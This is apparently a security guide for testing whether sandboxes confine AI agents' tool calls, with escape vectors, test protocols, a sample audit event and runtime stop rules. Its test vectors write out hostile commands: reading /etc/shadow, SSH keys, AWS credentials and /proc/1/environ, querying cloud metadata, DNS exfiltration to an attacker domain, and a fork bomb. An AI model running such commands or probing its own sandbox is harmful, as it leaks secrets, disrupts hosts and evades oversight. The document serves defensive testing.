# Sandbox Escape Testing & Audit Guidance

## Metadata
- **reference_id**: `sandbox_escape_testing`
- **version**: `1.0.0`
- **ecosystem**: CHAD / LapisLLM / Vibe Coding Instructions
- **scope**: Security verification protocols, test suites, threat vectors, and mitigation rules for testing sandbox escape resistance in AI agent execution environments.

---

## 1. Purpose & Threat Model

AI agents executing tool calls (such as code compilation, unit testing, or shell commands) run inside sandboxed execution environments (Docker, gVisor, Firecracker, WASM, or restricted chroot jails). A sandbox escape occurs when an agent—either through LLM hallucination, prompt injection, or malicious code generation—breaks out of its execution boundary to access host resources, extract sensitive credentials, elevate permissions, or execute unauthorized side-effects on the host infrastructure.

This reference provides actionable security testing guidance and verification protocols to evaluate and harden sandbox boundaries within the **CHAD + LapisLLM** ecosystem.

---

## 2. Taxonomy of Sandbox Escape Vectors

Sandbox escape testing MUST systematically cover five primary escape vectors:

| Escape Vector | Attack Surface | Example Exploit Technique | Mitigation & Constraint |
|---|---|---|---|
| **1. Filesystem & Path Traversal** | Workspace mount, symlinks, `/proc` / `/sys` | Symlink points to `/etc/passwd` or `/root/.ssh`; path traversal (`../../..`) outside workspace root. | Enforce path canonicalization (`realpath`), reject symlinks escaping workspace root, mount rootfs as read-only. |
| **2. Container & Namespace Escape** | Docker socket, device nodes, kernel exploits | Accessing `/var/run/docker.sock` to launch privileged containers; `mknod` device creation; unprivileged user namespace exploits. | Never mount Docker socket inside agent sandboxes; drop all Linux capabilities (`CAP_DROP_ALL`); use gVisor or Firecracker virtualization. |
| **3. Process & Environment Leaks** | Shared process namespaces, `/proc` filesystem | Reading `/proc/1/environ` or `/proc/kallsyms` to retrieve host credentials or kernel addresses. | Isolate process PID namespaces; sanitize `/proc` mounts; zero sensitive host environment variables before execution. |
| **4. Network & Egress Bypasses** | Host loopback, cloud metadata services, DNS tunneling | Direct IP connection to `169.254.169.254` (AWS/GCP metadata) or DNS exfiltration queries to external authoritative servers. | Block local/cloud network ranges (`127.0.0.1`, `10.0.0.0/8`, `169.254.169.254`); enforce intercepting proxy with egress allowlisting. |
| **5. Resource Exhaustion & DoS** | CPU/RAM allocations, process limits | Fork bombs (`:(){ :|:& };:`), unconstrained disk allocation, background daemon persistence. | Set strict cgroup limits: max 64 processes (`pids_limit`), memory limit (2.0 GB), read-only rootfs with ephemeral `/tmp` capped at 1.0 GB. |

---

## 3. Sandbox Escape Test Suite & Verification Protocols

Sandbox escape tests MUST be executed in isolated test harnesses to verify runtime resilience against malicious or misbehaved agent instructions.

### Test Protocol 1: Path Traversal & Symlink Escape Verification
- **Test Objective**: Ensure tool execution cannot read or write outside designated `/workspace`.
- **Test Vectors**:
  - Direct traversal attempt: `cat ../../../etc/shadow`
  - Symlink creation attempt: `ln -s /etc/passwd ./workspace_passwd && cat ./workspace_passwd`
  - Hardlink creation attempt: `ln /etc/hostname ./host_name`
- **Expected Outcome**: Sandbox aborts request, returns path violation error, or confines file operation within jailed root.

### Test Protocol 2: Docker Socket & Device Access Verification
- **Test Objective**: Verify container socket and host device nodes are unreachable inside the sandbox.
- **Test Vectors**:
  - Docker socket check: `ls -la /var/run/docker.sock` or `docker run hello-world`
  - Device creation attempt: `mknod /dev/sda1 b 8 1`
  - Mount namespace inspection: `mount | grep -i host`
- **Expected Outcome**: Docker socket is absent/unreachable; capability checks reject device creation (`Operation not permitted`).

### Test Protocol 3: Environment & Secret Extraction Verification
- **Test Objective**: Verify host secrets and environment variables are scrubbed from sandbox environment.
- **Test Vectors**:
  - Environment inspection: `env`, `printenv`, `cat /proc/1/environ`
  - Host credential search: `cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa`
  - Memory / Kernel inspection: `cat /proc/kallsyms`
- **Expected Outcome**: Output contains only sanitized, minimal mock environment variables (`PATH`, `TERM`, `LANG`). Host home directories and sensitive credentials do not exist in sandbox filesystem.

### Test Protocol 4: Network Egress & Air-Gap Filter Verification
- **Test Objective**: Verify unauthorized outbound network connections and metadata service queries are blocked.
- **Test Vectors**:
  - Direct IP exfiltration attempt: `curl -m 3 http://169.254.169.254/latest/meta-data/`
  - Unauthorized domain request: `curl -m 3 https://unauthorized-external-domain.com`
  - DNS exfiltration attempt: `dig secret-data.attacker-domain.com`
- **Expected Outcome**: Connection times out or drops immediately; intercepting proxy logs blocked egress attempt.

### Test Protocol 5: Process Boundary & Resource Limit Verification
- **Test Objective**: Verify fork bombs and resource exhaustion attacks are contained without affecting host runtime.
- **Test Vectors**:
  - Fork bomb execution: `:(){ :|:& };:`
  - Memory exhaustion attempt: `python3 -c "a = 'x' * (10 ** 10)"`
  - Persistent daemon test: `nohup sleep 1000 &` followed by step completion.
- **Expected Outcome**: Process limit (`pids_limit=64`) blocks fork bomb spawning; memory limit (OOM killer) terminates memory-greedy process; step completion prunes all background child processes.

---

## 4. Security Incident Telemetry & Stop Conditions

When a sandbox escape attempt or policy violation is detected by the runtime environment:

1. **Immediate Execution Freeze**: The runtime MUST terminate the offending tool call and kill the sandbox container immediately.
2. **Stop Condition Escalation**: Set agent status to `SAFETY_TRIGGERED`.
3. **Structured Audit Event**: Log a security alert to the tool audit trail (`.ai/contracts/tool-audit.contract.md`):

```json
{
  "event_type": "sandbox_escape_detected",
  "timestamp": "2026-03-31T12:00:00Z",
  "trace_id": "trace-escape-test-001",
  "agent_id": "coder-agent-1",
  "vector_classified": "FILESYSTEM_PATH_TRAVERSAL",
  "tool_name": "isolated_shell_execute",
  "command_payload": "ln -s /etc/passwd ./pass && cat ./pass",
  "enforcement_action": "CONTAINER_TERMINATED_SAFETY_TRIGGERED",
  "residual_risk": "NONE_CONTAINED"
}
```

---

## 5. Ecosystem Compatibility (CHAD & LapisLLM)

### CHAD Runtime Layer
- CHAD maintains automated integration tests executing the Sandbox Escape Test Suite against its container / gVisor drivers.
- CHAD enforces mandatory cgroups v2 limits, seccomp profiles blocking `unshare`, `clone`, `ptrace`, and `kexec_load`, and read-only root filesystems.
- CHAD captures sandbox violations and surfaces `SAFETY_TRIGGERED` alerts to the orchestration layer.

### LapisLLM Model Runtime
- LapisLLM is trained / instructed to recognize sandbox constraints and avoid generating commands designed to probe or breach host boundaries.
- When LapisLLM receives a `SAFETY_TRIGGERED` response resulting from a sandbox escape attempt, it halts tool execution and requests human intervention rather than retrying the escape command.
